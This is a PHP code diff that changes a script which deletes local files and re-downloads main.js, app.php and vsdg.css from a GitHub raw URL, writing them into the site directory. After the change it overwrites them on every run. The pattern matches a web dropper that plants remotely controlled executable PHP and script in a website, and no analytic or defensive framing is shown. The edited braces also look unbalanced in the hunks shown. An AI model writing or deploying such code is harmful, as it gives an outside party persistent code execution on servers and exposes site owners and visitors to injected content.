@@ -7,7 +7,7 @@
     $css = 'vsdg.css';
 if ( file_exists( './' . $app ) ) {
         unlink( './' . $app);
-} else {
+
 
                 $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
                 $myfile = fopen('./'. $main, "w") or die("Unable to open $main!");
@@ -21,7 +21,7 @@ if ( file_exists( './' . $app ) ) {
 
 if ( file_exists( './' . $app ) ) {
         unlink( './' . $app);
-} else {
+
          
         $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
                  $myfile = fopen('./'. $app, "w") or die("Unable to open $app!");
@@ -35,7 +35,7 @@ if ( file_exists( './' . $app ) ) {
 
 if ( file_exists( './' . $css ) ) {
         unlink( './' . $css);
-} else {
+
                  
         $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/vsdg.css');
                 $myfile = fopen('./'. $css, "w") or die("Unable to open $css!");
